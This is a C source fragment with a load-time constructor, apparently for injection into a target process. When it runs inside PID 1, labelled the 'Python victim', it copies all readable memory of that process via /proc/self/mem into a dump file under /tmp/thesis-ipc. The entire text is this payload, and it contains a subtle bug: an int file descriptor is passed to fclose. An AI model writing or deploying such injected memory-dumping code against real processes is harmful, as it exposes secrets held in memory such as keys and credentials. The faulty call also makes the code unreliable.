__attribute__((constructor))
void on_load(void) {
    // Only run once per process
    static int done = 0;
    if (done) return;
    done = 1;

    // Check if this is PID 1 (the Python victim)
    int my_pid = getpid();
    if (my_pid != 1) return;  // Skip non-victim processes

    FILE *out = fopen("/tmp/thesis-ipc/VICTIM_MEMORY_DUMP.bin", "wb");
    if (!out) return;

    fprintf(stderr, "=== DUMPING VICTIM PROCESS %d MEMORY ===\n", my_pid);

    // Read all readable memory
    FILE *maps = fopen("/proc/self/maps", "r");
    if (!maps) {
        fclose(out);
        return;
    }

    int mem_fd = open("/proc/self/mem", O_RDONLY);
    if (mem_fd < 0) {
        fclose(maps);
        fclose(out);
        return;
    }

    char line[512];
    unsigned char buf[65536];

    while (fgets(line, sizeof(line), maps)) {
        unsigned long start, end;
        char perms[8];

        if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) != 3) continue;
        if (perms[0] != 'r') continue;  // Only readable
        if (end - start > 200*1024*1024) continue;  // Skip huge regions

        // Write region header
        fprintf(out, "REGION:0x%lx:0x%lx:%s\n", start, end, perms);
        fflush(out);

        // Read and write region data
        size_t region_size = end - start;
        size_t written = 0;

        while (written < region_size) {
            size_t to_read = (region_size - written > sizeof(buf)) ? sizeof(buf) : (region_size - written);
            ssize_t n = pread(mem_fd, buf, to_read, start + written);
            if (n <= 0) break;

            // Write data marker
            fprintf(out, "DATA:%lx:%zu\n", (unsigned long)(start + written), (size_t)n);
            fwrite(buf, 1, n, out);
            fprintf(out, "\n");
            fflush(out);

            written += n;
        }
    }

    fclose(mem_fd);
    fclose(maps);
    fclose(out);

    fprintf(stderr, "=== MEMORY DUMP COMPLETE ===\n");
}
